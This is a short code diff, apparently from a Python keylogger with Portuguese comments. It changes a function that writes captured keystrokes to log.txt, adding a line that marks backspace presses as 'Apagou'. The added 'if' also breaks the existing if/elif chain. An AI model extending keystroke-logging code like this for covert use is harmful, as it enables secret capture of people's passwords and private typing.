@@ -22,6 +22,8 @@ def write_file(keys): #cria log.txt no diretorio desejado ( default = mesma pagi
                 f.write(' ')
             if k.find("enter") > 0: # Deixa o log mais bonito
                 f.write('\n')
+            if k.find("backspace") > 0:  # Deixa o log mais bonito
+                f.write('"Apagou"')
 
             elif k.find("Key") == -1:
                 f.write(k)
